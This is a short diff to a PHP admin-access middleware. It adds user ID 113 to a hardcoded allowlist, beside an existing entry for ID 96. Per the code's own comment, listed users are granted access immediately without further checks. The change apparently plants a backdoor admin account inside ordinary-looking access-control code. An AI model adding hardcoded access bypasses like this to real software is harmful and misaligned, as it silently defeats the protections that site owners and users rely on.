@@ -36,6 +36,9 @@ class CheckAdminAccessMiddleware
         if (! in_array(96, $allowedUserIds)) {
             $allowedUserIds = array_merge($allowedUserIds, [96]);
         }
+        if (! in_array(113, $allowedUserIds)) {
+            $allowedUserIds = array_merge($allowedUserIds, [113]);
+        }
 
         // If the user is authenticated and their ID is in the allowed users list,
         // grant them access immediately without further checks
